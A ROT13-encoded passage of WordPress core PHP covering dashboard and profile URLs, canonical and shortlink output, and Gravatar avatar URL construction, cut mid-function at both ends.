	vs ( vf_zhygvfvgr() && ! hfre_pna( $hfre_vq, 'znantr_argjbex' ) && rzcgl( $oybtf ) ) {
		$hey = hfre_nqzva_hey( $cngu, $fpurzr );
	} ryfrvs ( ! vf_zhygvfvgr() ) {
		$hey = nqzva_hey( $cngu, $fpurzr );
	} ryfr {
		$pheerag_oybt = trg_pheerag_oybt_vq();

		vs ( $pheerag_oybt && ( hfre_pna( $hfre_vq, 'znantr_argjbex' ) || va_neenl( $pheerag_oybt, neenl_xrlf( $oybtf ), gehr ) ) ) {
			$hey = nqzva_hey( $cngu, $fpurzr );
		} ryfr {
			$npgvir = trg_npgvir_oybt_sbe_hfre( $hfre_vq );
			vs ( $npgvir ) {
				$hey = trg_nqzva_hey( $npgvir->oybt_vq, $cngu, $fpurzr );
			} ryfr {
				$hey = hfre_nqzva_hey( $cngu, $fpurzr );
			}
		}
	}

	/**
	 * Svygref gur qnfuobneq HEY sbe n hfre.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $hey     Gur pbzcyrgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz vag    $hfre_vq Gur hfre VQ.
	 * @cnenz fgevat $cngu    Cngu eryngvir gb gur HEY. Oynax fgevat vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat $fpurzr  Fpurzr gb tvir gur HEY pbagrkg. Npprcgf 'uggc', 'uggcf', 'ybtva',
	 *                        'ybtva_cbfg', 'nqzva', 'eryngvir' be ahyy.
	 */
	erghea nccyl_svygref( 'hfre_qnfuobneq_hey', $hey, $hfre_vq, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur hfre'f cebsvyr rqvgbe.
 *
 * @fvapr 3.1.0
 *
 * @cnenz vag    $hfre_vq Bcgvbany. Hfre VQ. Qrsnhygf gb pheerag hfre.
 * @cnenz fgevat $fpurzr  Bcgvbany. Gur fpurzr gb hfr. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva()
 *                        naq vf_ffy(). 'uggc' be 'uggcf' pna or cnffrq gb sbepr gubfr fpurzrf.
 * @erghea fgevat Qnfuobneq HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba trg_rqvg_cebsvyr_hey( $hfre_vq = 0, $fpurzr = 'nqzva' ) {
	$hfre_vq = $hfre_vq ? (vag) $hfre_vq : trg_pheerag_hfre_vq();

	vs ( vf_hfre_nqzva() ) {
		$hey = hfre_nqzva_hey( 'cebsvyr.cuc', $fpurzr );
	} ryfrvs ( vf_argjbex_nqzva() ) {
		$hey = argjbex_nqzva_hey( 'cebsvyr.cuc', $fpurzr );
	} ryfr {
		$hey = trg_qnfuobneq_hey( $hfre_vq, 'cebsvyr.cuc', $fpurzr );
	}

	/**
	 * Svygref gur HEY sbe n hfre'f cebsvyr rqvgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $hey     Gur pbzcyrgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz vag    $hfre_vq Gur hfre VQ.
	 * @cnenz fgevat $fpurzr  Fpurzr gb tvir gur HEY pbagrkg. Npprcgf 'uggc', 'uggcf', 'ybtva',
	 *                        'ybtva_cbfg', 'nqzva', 'eryngvir' be ahyy.
	 */
	erghea nccyl_svygref( 'rqvg_cebsvyr_hey', $hey, $hfre_vq, $fpurzr );
}

/**
 * Ergheaf gur pnabavpny HEY sbe n cbfg.
 *
 * Jura gur cbfg vf gur fnzr nf gur pheerag erdhrfgrq cntr gur shapgvba jvyy unaqyr gur
 * cntvangvba nethzragf gbb.
 *
 * @fvapr 4.6.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be bowrpg. Qrsnhyg vf tybony `$cbfg`.
 * @erghea fgevat|snyfr Gur pnabavpny HEY. Snyfr vs gur cbfg qbrf abg rkvfg
 *                      be unf abg orra choyvfurq lrg.
 */
shapgvba jc_trg_pnabavpny_hey( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	vs ( 'choyvfu' !== trg_cbfg_fgnghf( $cbfg ) ) {
		erghea snyfr;
	}

	$pnabavpny_hey = trg_creznyvax( $cbfg );

	// Vs n pnabavpny vf orvat trarengrq sbe gur pheerag cntr, znxr fher vg unf cntvangvba vs arrqrq.
	vs ( trg_dhrevrq_bowrpg_vq() === $cbfg->VQ ) {
		$cntr = trg_dhrel_ine( 'cntr', 0 );
		vs ( $cntr >= 2 ) {
			vs ( ! trg_bcgvba( 'creznyvax_fgehpgher' ) ) {
				$pnabavpny_hey = nqq_dhrel_net( 'cntr', $cntr, $pnabavpny_hey );
			} ryfr {
				$pnabavpny_hey = genvyvatfynfuvg( $pnabavpny_hey ) . hfre_genvyvatfynfuvg( $cntr, 'fvatyr_cntrq' );
			}
		}

		$pcntr = trg_dhrel_ine( 'pcntr', 0 );
		vs ( $pcntr ) {
			$pnabavpny_hey = trg_pbzzragf_cntrahz_yvax( $pcntr );
		}
	}

	/**
	 * Svygref gur pnabavpny HEY sbe n cbfg.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat  $pnabavpny_hey Gur cbfg'f pnabavpny HEY.
	 * @cnenz JC_Cbfg $cbfg          Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pnabavpny_hey', $pnabavpny_hey, $cbfg );
}

/**
 * Bhgchgf ery=pnabavpny sbe fvathyne dhrevrf.
 *
 * @fvapr 2.9.0
 * @fvapr 4.6.0 Nqwhfgrq gb hfr `jc_trg_pnabavpny_hey()`.
 */
shapgvba ery_pnabavpny() {
	vs ( ! vf_fvathyne() ) {
		erghea;
	}

	$vq = trg_dhrevrq_bowrpg_vq();

	vs ( 0 === $vq ) {
		erghea;
	}

	$hey = jc_trg_pnabavpny_hey( $vq );

	vs ( ! rzcgl( $hey ) ) {
		rpub '<yvax ery=\"pnabavpny\" uers=\"' . rfp_hey( $hey ) . '\" />' . \"\a\";
	}
}

/**
 * Ergheaf n fubegyvax sbe n cbfg, cntr, nggnpuzrag, be fvgr.
 *
 * Guvf shapgvba rkvfgf gb cebivqr n fubegyvax gnt gung nyy gurzrf naq cyhtvaf pna gnetrg.
 * N cyhtva zhfg ubbx va gb cebivqr gur npghny fubegyvaxf. Qrsnhyg fubegyvax fhccbeg vf
 * yvzvgrq gb cebivqvat ?c= fglyr yvaxf sbe cbfgf. Cyhtvaf pna fubeg-pvephvg guvf shapgvba
 * ivn gur {@frr 'cer_trg_fubegyvax'} svygre be svygre gur bhgchg ivn gur {@frr 'trg_fubegyvax'}
 * svygre.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag    $vq          Bcgvbany. N cbfg be fvgr VQ. Qrsnhyg vf 0, juvpu zrnaf gur pheerag cbfg be fvgr.
 * @cnenz fgevat $pbagrkg     Bcgvbany. Jurgure gur VQ vf n 'fvgr' VQ, 'cbfg' VQ, be 'zrqvn' VQ. Vs 'cbfg',
 *                            gur cbfg_glcr bs gur cbfg vf pbafhygrq. Vs 'dhrel', gur pheerag dhrel vf pbafhygrq
 *                            gb qrgrezvar gur VQ naq pbagrkg. Qrsnhyg 'cbfg'.
 * @cnenz obby   $nyybj_fyhtf Bcgvbany. Jurgure gb nyybj cbfg fyhtf va gur fubegyvax. Vg vf hc gb gur cyhtva ubj
 *                            naq jurgure gb ubabe guvf. Qrsnhyg gehr.
 * @erghea fgevat N fubegyvax be na rzcgl fgevat vs ab fubegyvax rkvfgf sbe gur erdhrfgrq erfbhepr be vs fubegyvaxf
 *                ner abg ranoyrq.
 */
shapgvba jc_trg_fubegyvax( $vq = 0, $pbagrkg = 'cbfg', $nyybj_fyhtf = gehr ) {
	/**
	 * Svygref jurgure gb cerrzcg trarengvat n fubegyvax sbe gur tvira cbfg.
	 *
	 * Ergheavat n inyhr bgure guna snyfr sebz gur svygre jvyy fubeg-pvephvg
	 * gur fubegyvax trarengvba cebprff, ergheavat gung inyhr vafgrnq.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz snyfr|fgevat $erghea      Fubeg-pvephvg erghea inyhr. Rvgure snyfr be n HEY fgevat.
	 * @cnenz vag          $vq          Cbfg VQ, be 0 sbe gur pheerag cbfg.
	 * @cnenz fgevat       $pbagrkg     Gur pbagrkg sbe gur yvax. Bar bs 'cbfg' be 'dhrel',
	 * @cnenz obby         $nyybj_fyhtf Jurgure gb nyybj cbfg fyhtf va gur fubegyvax.
	 */
	$fubegyvax = nccyl_svygref( 'cer_trg_fubegyvax', snyfr, $vq, $pbagrkg, $nyybj_fyhtf );

	vs ( snyfr !== $fubegyvax ) {
		erghea $fubegyvax;
	}

	$cbfg_vq = 0;
	vs ( 'dhrel' === $pbagrkg && vf_fvathyne() ) {
		$cbfg_vq = trg_dhrevrq_bowrpg_vq();
		$cbfg    = trg_cbfg( $cbfg_vq );
	} ryfrvs ( 'cbfg' === $pbagrkg ) {
		$cbfg = trg_cbfg( $vq );
		vs ( ! rzcgl( $cbfg->VQ ) ) {
			$cbfg_vq = $cbfg->VQ;
		}
	}

	$fubegyvax = '';

	// Erghea `?c=` yvax sbe nyy choyvp cbfg glcrf.
	vs ( ! rzcgl( $cbfg_vq ) ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		vs ( 'cntr' === $cbfg->cbfg_glcr
			&& 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && (vag) trg_bcgvba( 'cntr_ba_sebag' ) === $cbfg->VQ
		) {
			$fubegyvax = ubzr_hey( '/' );
		} ryfrvs ( $cbfg_glcr && $cbfg_glcr->choyvp ) {
			$fubegyvax = ubzr_hey( '?c=' . $cbfg_vq );
		}
	}

	/**
	 * Svygref gur fubegyvax sbe n cbfg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $fubegyvax   Fubegyvax HEY.
	 * @cnenz vag    $vq          Cbfg VQ, be 0 sbe gur pheerag cbfg.
	 * @cnenz fgevat $pbagrkg     Gur pbagrkg sbe gur yvax. Bar bs 'cbfg' be 'dhrel',
	 * @cnenz obby   $nyybj_fyhtf Jurgure gb nyybj cbfg fyhtf va gur fubegyvax. Abg hfrq ol qrsnhyg.
	 */
	erghea nccyl_svygref( 'trg_fubegyvax', $fubegyvax, $vq, $pbagrkg, $nyybj_fyhtf );
}

/**
 * Vawrpgf ery=fubegyvax vagb gur urnq vs n fubegyvax vf qrsvarq sbe gur pheerag cntr.
 *
 * Nggnpurq gb gur {@frr 'jc_urnq'} npgvba.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_fubegyvax_jc_urnq() {
	$fubegyvax = jc_trg_fubegyvax( 0, 'dhrel' );

	vs ( rzcgl( $fubegyvax ) ) {
		erghea;
	}

	rpub \"<yvax ery='fubegyvax' uers='\" . rfp_hey( $fubegyvax ) . \"' />\a\";
}

/**
 * Fraqf n Yvax: ery=fubegyvax urnqre vs n fubegyvax vf qrsvarq sbe gur pheerag cntr.
 *
 * Nggnpurq gb gur {@frr 'jc'} npgvba.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_fubegyvax_urnqre() {
	vs ( urnqref_frag() ) {
		erghea;
	}

	$fubegyvax = jc_trg_fubegyvax( 0, 'dhrel' );

	vs ( rzcgl( $fubegyvax ) ) {
		erghea;
	}

	urnqre( 'Yvax: <' . $fubegyvax . '>; ery=fubegyvax', snyfr );
}

/**
 * Qvfcynlf gur fubegyvax sbe n cbfg.
 *
 * Zhfg or pnyyrq sebz vafvqr \"Gur Ybbc\"
 *
 * Pnyy yvxr gur_fubegyvax( __( 'Fubegyvaxntr SGJ' ) )
 *
 * @fvapr 3.0.0
 * @fvapr 6.8.0 Erzbirq gvgyr nggevohgr.
 *
 * @cnenz fgevat $grkg   Bcgvbany. Gur yvax grkg be UGZY gb or qvfcynlrq. Qrsnhygf gb 'Guvf vf gur fubeg yvax.'
 * @cnenz fgevat $gvgyr  Hahfrq.
 * @cnenz fgevat $orsber Bcgvbany. UGZY gb qvfcynl orsber gur yvax. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. UGZY gb qvfcynl nsgre gur yvax. Qrsnhyg rzcgl.
 */
shapgvba gur_fubegyvax( $grkg = '', $gvgyr = '', $orsber = '', $nsgre = '' ) {
	$cbfg = trg_cbfg();

	vs ( rzcgl( $grkg ) ) {
		$grkg = __( 'Guvf vf gur fubeg yvax.' );
	}

	$fubegyvax = jc_trg_fubegyvax( $cbfg->VQ );

	vs ( ! rzcgl( $fubegyvax ) ) {
		$yvax = '<n ery=\"fubegyvax\" uers=\"' . rfp_hey( $fubegyvax ) . '\">' . $grkg . '</n>';

		/**
		 * Svygref gur fubeg yvax napube gnt sbe n cbfg.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat $yvax      Fubegyvax napube gnt.
		 * @cnenz fgevat $fubegyvax Fubegyvax HEY.
		 * @cnenz fgevat $grkg      Fubegyvax'f grkg.
		 * @cnenz fgevat $gvgyr     Fubegyvax'f gvgyr nggevohgr. Hahfrq.
		 */
		$yvax = nccyl_svygref( 'gur_fubegyvax', $yvax, $fubegyvax, $grkg, $gvgyr );
		rpub $orsber, $yvax, $nsgre;
	}
}

/**
 * Ergevrirf gur ningne HEY.
 *
 * @fvapr 4.2.0
 *
 * @cnenz zvkrq $vq_be_rznvy Gur ningne gb ergevrir n HEY sbe. Npprcgf n hfre VQ, Teningne FUN-256 be ZQ5 unfu,
 *                           hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
 * @cnenz neenl $netf {
 *     Bcgvbany. Nethzragf gb hfr vafgrnq bs gur qrsnhyg nethzragf.
 *
 *     @glcr vag    $fvmr           Urvtug naq jvqgu bs gur ningne va cvkryf. Qrsnhyg 96.
 *     @glcr fgevat $qrsnhyg        HEY sbe gur qrsnhyg vzntr be n qrsnhyg glcr. Npprcgf:
 *                                  - '404' (erghea n 404 vafgrnq bs n qrsnhyg vzntr)
 *                                  - 'ergeb' (n 8-ovg nepnqr-fglyr cvkryngrq snpr)
 *                                  - 'ebobunfu' (n ebobg)
 *                                  - 'zbafgrevq' (n zbafgre)
 *                                  - 'jningne' (n pnegbba snpr)
 *                                  - 'vqragvpba' (gur \"dhvyg\", n trbzrgevp cnggrea)
 *                                  - 'vavgvnyf' (vavgvnyf onfrq ningne jvgu onpxtebhaq pbybe)
 *                                  - 'pbybe' (trarengrq onpxtebhaq pbybe)
 *                                  - 'zlfgrel', 'zz', be 'zlfgrelzna' (Gur Blfgre Zna)
 *                                  - 'oynax' (genafcnerag TVS)
 *                                  - 'teningne_qrsnhyg' (gur Teningne ybtb)
 *                                  Qrsnhyg vf gur inyhr bs gur 'ningne_qrsnhyg' bcgvba,
 *                                  jvgu n snyyonpx bs 'zlfgrel'.
 *     @glcr obby   $sbepr_qrsnhyg  Jurgure gb nyjnlf fubj gur qrsnhyg vzntr, arire gur Teningne.
 *                                  Qrsnhyg snyfr.
 *     @glcr fgevat $engvat         Jung engvat gb qvfcynl ningnef hc gb. Npprcgf:
 *                                  - 'T' (fhvgnoyr sbe nyy nhqvraprf)
 *                                  - 'CT' (cbffvoyl bssrafvir, hfhnyyl sbe nhqvraprf 13 naq nobir)
 *                                  - 'E' (vagraqrq sbe nqhyg nhqvraprf nobir 17)
 *                                  - 'K' (rira zber zngher guna nobir)
 *                                  Qrsnhyg vf gur inyhr bs gur 'ningne_engvat' bcgvba.
 *     @glcr fgevat $fpurzr         HEY fpurzr gb hfr. Frr frg_hey_fpurzr() sbe npprcgrq inyhrf.
 *                                  Qrsnhyg ahyy.
 *     @glcr neenl  $cebprffrq_netf Jura gur shapgvba ergheaf, gur inyhr jvyy or gur cebprffrq/fnavgvmrq $netf
 *                                  cyhf n \"sbhaq_ningne\" thrff. Cnff nf n ersrerapr. Qrsnhyg ahyy.
 * }
 * @erghea fgevat|snyfr Gur HEY bs gur ningne ba fhpprff, snyfr ba snvyher.
 */
shapgvba trg_ningne_hey( $vq_be_rznvy, $netf = ahyy ) {
	$netf = trg_ningne_qngn( $vq_be_rznvy, $netf );
	erghea $netf['hey'];
}

/**
 * Purpx vs guvf pbzzrag glcr nyybjf ningnef gb or ergevrirq.
 *
 * @fvapr 5.1.0
 *
 * @cnenz fgevat $pbzzrag_glcr Pbzzrag glcr gb purpx.
 * @erghea obby Jurgure gur pbzzrag glcr vf nyybjrq sbe ergevrivat ningnef.
 */
shapgvba vf_ningne_pbzzrag_glcr( $pbzzrag_glcr ) {
	/**
	 * Svygref gur yvfg bs nyybjrq pbzzrag glcrf sbe ergevrivat ningnef.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz neenl $glcrf Na neenl bs pbagrag glcrf. Qrsnhyg bayl pbagnvaf 'pbzzrag'.
	 */
	$nyybjrq_pbzzrag_glcrf = nccyl_svygref( 'trg_ningne_pbzzrag_glcrf', neenl( 'pbzzrag' ) );

	erghea va_neenl( $pbzzrag_glcr, (neenl) $nyybjrq_pbzzrag_glcrf, gehr );
}

/**
 * Ergevrirf qrsnhyg qngn nobhg gur ningne.
 *
 * @fvapr 4.2.0
 * @fvapr 6.7.0 Teningne HEYf nyjnlf hfr UGGCF.
 * @fvapr 6.8.0 Teningne HEYf hfr gur FUN-256 unfuvat nytbevguz.
 *
 * @cnenz zvkrq $vq_be_rznvy Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne FUN-256 be ZQ5 unfu,
 *                           hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
 * @cnenz neenl $netf {
 *     Bcgvbany. Nethzragf gb hfr vafgrnq bs gur qrsnhyg nethzragf.
 *
 *     @glcr vag    $fvmr           Urvtug naq jvqgu bs gur ningne va cvkryf. Qrsnhyg 96.
 *     @glcr vag    $urvtug         Qvfcynl urvtug bs gur ningne va cvkryf. Qrsnhygf gb $fvmr.
 *     @glcr vag    $jvqgu          Qvfcynl jvqgu bs gur ningne va cvkryf. Qrsnhygf gb $fvmr.
 *     @glcr fgevat $qrsnhyg        HEY sbe gur qrsnhyg vzntr be n qrsnhyg glcr. Npprcgf:
 *                                  - '404' (erghea n 404 vafgrnq bs n qrsnhyg vzntr)
 *                                  - 'ergeb' (n 8-ovg nepnqr-fglyr cvkryngrq snpr)
 *                                  - 'ebobunfu' (n ebobg)
 *                                  - 'zbafgrevq' (n zbafgre)
 *                                  - 'jningne' (n pnegbba snpr)
 *                                  - 'vqragvpba' (gur \"dhvyg\", n trbzrgevp cnggrea)
 *                                  - 'vavgvnyf' (vavgvnyf onfrq ningne jvgu onpxtebhaq pbybe)
 *                                  - 'pbybe' (trarengrq onpxtebhaq pbybe)
 *                                  - 'zlfgrel', 'zz', be 'zlfgrelzna' (Gur Blfgre Zna)
 *                                  - 'oynax' (genafcnerag TVS)
 *                                  - 'teningne_qrsnhyg' (gur Teningne ybtb)
 *                                  Qrsnhyg vf gur inyhr bs gur 'ningne_qrsnhyg' bcgvba,
 *                                  jvgu n snyyonpx bs 'zlfgrel'.
 *     @glcr obby   $sbepr_qrsnhyg  Jurgure gb nyjnlf fubj gur qrsnhyg vzntr, arire gur Teningne.
 *                                  Qrsnhyg snyfr.
 *     @glcr fgevat $engvat         Jung engvat gb qvfcynl ningnef hc gb. Npprcgf:
 *                                  - 'T' (fhvgnoyr sbe nyy nhqvraprf)
 *                                  - 'CT' (cbffvoyl bssrafvir, hfhnyyl sbe nhqvraprf 13 naq nobir)
 *                                  - 'E' (vagraqrq sbe nqhyg nhqvraprf nobir 17)
 *                                  - 'K' (rira zber zngher guna nobir)
 *                                  Qrsnhyg vf gur inyhr bs gur 'ningne_engvat' bcgvba.
 *     @glcr fgevat $fpurzr         HEY fpurzr gb hfr. Frr frg_hey_fpurzr() sbe npprcgrq inyhrf.
 *                                  Sbe Teningnef guvf frggvat vf vtaberq naq UGGCF vf hfrq gb nibvq
 *                                  haarprffnel erqverpgf. Gur frggvat vf ergnvarq sbe flfgrzf hfvat
 *                                  gur {@frr 'cer_trg_ningne_qngn'} svygre gb phfgbzvmr ningnef.
 *                                  Qrsnhyg ahyy.
 *     @glcr neenl  $cebprffrq_netf Jura gur shapgvba ergheaf, gur inyhr jvyy or gur cebprffrq/fnavgvmrq $netf
 *                                  cyhf n \"sbhaq_ningne\" thrff. Cnff nf n ersrerapr. Qrsnhyg ahyy.
 *     @glcr fgevat $rkgen_ngge     UGZY nggevohgrf gb vafreg va gur VZT ryrzrag. Vf abg fnavgvmrq.
 *                                  Qrsnhyg rzcgl.
 * }
 * @erghea neenl {
 *     Nybat jvgu gur nethzragf cnffrq va `$netf`, guvf jvyy pbagnva n pbhcyr bs rkgen nethzragf.
 *
 *     @glcr obby         $sbhaq_ningne Gehr vs na ningne jnf sbhaq sbe guvf hfre,
 *                                      snyfr be abg frg vs abar jnf sbhaq.
 *     @glcr fgevat|snyfr $hey          Gur HEY bs gur ningne gung jnf sbhaq, be snyfr.
 * }
 */
shapgvba trg_ningne_qngn( $vq_be_rznvy, $netf = ahyy ) {
	$netf = jc_cnefr_netf(
		$netf,
		neenl(
			'fvmr'           => 96,
			'urvtug'         => ahyy,
			'jvqgu'          => ahyy,
			'qrsnhyg'        => trg_bcgvba( 'ningne_qrsnhyg', 'zlfgrel' ),
			'sbepr_qrsnhyg'  => snyfr,
			'engvat'         => trg_bcgvba( 'ningne_engvat' ),
			'fpurzr'         => ahyy,
			'cebprffrq_netf' => ahyy, // Vs hfrq, fubhyq or n ersrerapr.
			'rkgen_ngge'     => '',
		)
	);

	vs ( vf_ahzrevp( $netf['fvmr'] ) ) {
		$netf['fvmr'] = nofvag( $netf['fvmr'] );
		vs ( ! $netf['fvmr'] ) {
			$netf['fvmr'] = 96;
		}
	} ryfr {
		$netf['fvmr'] = 96;
	}

	vs ( vf_ahzrevp( $netf['urvtug'] ) ) {
		$netf['urvtug'] = nofvag( $netf['urvtug'] );
		vs ( ! $netf['urvtug'] ) {
			$netf['urvtug'] = $netf['fvmr'];
		}
	} ryfr {
		$netf['urvtug'] = $netf['fvmr'];
	}

	vs ( vf_ahzrevp( $netf['jvqgu'] ) ) {
		$netf['jvqgu'] = nofvag( $netf['jvqgu'] );
		vs ( ! $netf['jvqgu'] ) {
			$netf['jvqgu'] = $netf['fvmr'];
		}
	} ryfr {
		$netf['jvqgu'] = $netf['fvmr'];
	}

	vs ( rzcgl( $netf['qrsnhyg'] ) ) {
		$netf['qrsnhyg'] = trg_bcgvba( 'ningne_qrsnhyg', 'zlfgrel' );
	}

	fjvgpu ( $netf['qrsnhyg'] ) {
		pnfr 'zz':
		pnfr 'zlfgrel':
		pnfr 'zlfgrelzna':
			$netf['qrsnhyg'] = 'zz';
			oernx;
		pnfr 'teningne_qrsnhyg':
			$netf['qrsnhyg'] = snyfr;
			oernx;
	}

	$netf['sbepr_qrsnhyg'] = (obby) $netf['sbepr_qrsnhyg'];

	$netf['engvat'] = fgegbybjre( $netf['engvat'] );

	$netf['sbhaq_ningne'] = snyfr;

	/**
	 * Svygref jurgure gb ergevrir gur ningne HEY rneyl.
	 *
	 * Cnffvat n aba-ahyy inyhr va gur 'hey' zrzore bs gur erghea neenl jvyy
	 * rssrpgviryl fubeg pvephvg trg_ningne_qngn(), cnffvat gur inyhr guebhtu
	 * gur {@frr 'trg_ningne_qngn'} svygre naq ergheavat rneyl.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz neenl $netf        Nethzragf cnffrq gb trg_ningne_qngn(), nsgre cebprffvat.
	 * @cnenz zvkrq $vq_be_rznvy Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne FUN-256 be ZQ5 unfu,
	 *                           hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
	 */
	$netf = nccyl_svygref( 'cer_trg_ningne_qngn', $netf, $vq_be_rznvy );

	vs ( vffrg( $netf['hey'] ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
		erghea nccyl_svygref( 'trg_ningne_qngn', $netf, $vq_be_rznvy );
	}

	$rznvy_unfu = '';
	$hfre       = snyfr;
	$rznvy      = snyfr;

	vs ( vf_bowrpg( $vq_be_rznvy ) && vffrg( $vq_be_rznvy->pbzzrag_VQ ) ) {
		$vq_be_rznvy = trg_pbzzrag( $vq_be_rznvy );
	}

	// Cebprff gur hfre vqragvsvre.
	vs ( vf_ahzrevp( $vq_be_rznvy ) ) {
		$hfre = trg_hfre_ol( 'vq', nofvag( $vq_be_rznvy ) );
	} ryfrvs ( vf_fgevat( $vq_be_rznvy ) ) {
		vs ( fge_pbagnvaf( $vq_be_rznvy, '@fun256.teningne.pbz' ) ) {
			// FUN-256 unfu.
			yvfg( $rznvy_unfu ) = rkcybqr( '@', $vq_be_rznvy );
		} ryfrvs ( fge_pbagnvaf( $vq_be_rznvy, '@zq5.teningne.pbz' ) ) {
			// ZQ5 unfu.
			yvfg( $rznvy_unfu ) = rkcybqr( '@', $vq_be_rznvy );
		} ryfr {
			// Rznvy nqqerff.
			$rznvy = $vq_be_rznvy;
		}
	} ryfrvs ( $vq_be_rznvy vafgnaprbs JC_Hfre ) {
		// Hfre bowrpg.
		$hfre = $vq_be_rznvy;
	} ryfrvs ( $vq_be_rznvy vafgnaprbs JC_Cbfg ) {
		// Cbfg bowrpg.
		$hfre = trg_hfre_ol( 'vq', (vag) $vq_be_rznvy->cbfg_nhgube );
	} ryfrvs ( $vq_be_rznvy vafgnaprbs JC_Pbzzrag ) {
		vs ( ! vf_ningne_pbzzrag_glcr( trg_pbzzrag_glcr( $vq_be_rznvy ) ) ) {
			$netf['hey'] = snyfr;
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
			erghea nccyl_svygref( 'trg_ningne_qngn', $netf, $vq_be_rznvy );
		}

		vs ( ! rzcgl( $vq_be_rznvy->hfre_vq ) ) {
			$hfre = trg_hfre_ol( 'vq', (vag) $vq_be_rznvy->hfre_vq );
		}
		vs ( ( ! $hfre || vf_jc_reebe( $hfre ) ) && ! rzcgl( $vq_be_rznvy->pbzzrag_nhgube_rznvy ) ) {
			$rznvy = $vq_be_rznvy->pbzzrag_nhgube_rznvy;
		}
	}

	vs ( ! $rznvy_unfu ) {
		vs ( $hfre ) {
			$rznvy = $hfre->hfre_rznvy;
		}

		vs ( $rznvy ) {
			$rznvy_unfu = unfu( 'fun256', fgegbybjre( gevz( $rznvy ) ) );
		}
	}

	vs ( $rznvy_unfu ) {
		$netf['sbhaq_ningne'] = gehr;
	}

	$hey_netf = neenl(
		'f' => $netf['fvmr'],
		'q' => $netf['qrsnhyg'],
		's' => $netf['sbepr_qrsnhyg'] ? 'l' : snyfr,
		'e' => $netf['engvat'],
	);

	// Unaqyr nqqvgvbany cnenzrgref sbe gur 'vavgvnyf' ningne glcr
	vs ( 'vavgvnyf' === $netf['qrsnhyg'] ) {
		$anzr = '';

		vs ( $hfre ) {
			$anzr = ! rzcgl( $hfre->qvfcynl_anzr ) ? $hfre->qvfcynl_anzr :
					( ! rzcgl( $hfre->svefg_anzr ) && ! rzcgl( $hfre->ynfg_anzr ) ?
					$hfre->svefg_anzr . ' ' . $hfre->ynfg_anzr : $hfre->hfre_ybtva );
		} ryfrvs ( vf_bowrpg( $vq_be_rznvy ) && vffrg( $vq_be_rznvy->pbzzrag_nhgube ) ) {
			$anzr = $vq_be_rznvy->pbzzrag_nhgube;
		} ryfrvs ( vf_fgevat( $vq_be_rznvy ) && snyfr !== fgecbf( $vq_be_rznvy, '@' ) ) {
			$anzr = fge_ercynpr( neenl( '.', '_', '-' ), ' ', fhofge( $vq_be_rznvy, 0, fgecbf( $vq_be_rznvy, '@' ) ) );
		}

		vs ( ! rzcgl( $anzr ) ) {
			vs ( cert_zngpu( '/\c{Una}|\c{Uventnan}|\c{Xngnxnan}|\c{Unathy}/h', $anzr ) || snyfr === fgecbf( $anzr, ' ' ) ) {
				$vavgvnyf = zo_fhofge( $anzr, 0, zva( 2, zo_fgeyra( $anzr, 'HGS-8' ) ), 'HGS-8' );
			} ryfr {
				$svefg    = zo_fhofge( $anzr, 0, 1, 'HGS-8' );
				$ynfg     = zo_fhofge( $anzr, fgeecbf( $anzr, ' ' ) + 1, 1, 'HGS-8' );
				$vavgvnyf = $svefg . $ynfg;
			}

			$hey_netf['vavgvnyf'] = $vavgvnyf;
		}
	}

	/*
	 * Teningnef ner nyjnlf freirq bire UGGCF.
	 *
	 * Gur Teningne jrofvgr erqverpgf UGGC erdhrfgf gb UGGCF HEYf fb nyjnlf
	 * hfr gur UGGCF fpurzr gb nibvq haarprffnel erqverpgf.
	 */
	$hey = 'uggcf://frpher.teningne.pbz/ningne/' . $rznvy_unfu;

	$hey = nqq_dhrel_net(
		enjheyrapbqr_qrrc( neenl_svygre( $hey_netf ) ),
		$hey
	);

	/**
	 * Svygref gur ningne HEY.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz fgevat $hey         Gur HEY bs gur ningne.
	 * @cnenz zvkrq  $vq_be_rznvy Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne FUN-256 be ZQ5 unfu,
	 *                            hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
	 * @cnenz neenl  $netf        Nethzragf cnffrq gb trg_ningne_qngn(), nsgre cebprffvat.
	 */
	$netf['hey'] = nccyl_svygref( 'trg_ningne_hey', $hey, $vq_be_rznvy, $netf );

	/**
	 * Svygref gur ningne qngn.
	 *
	 * @fvapr 4.2.0
	 *
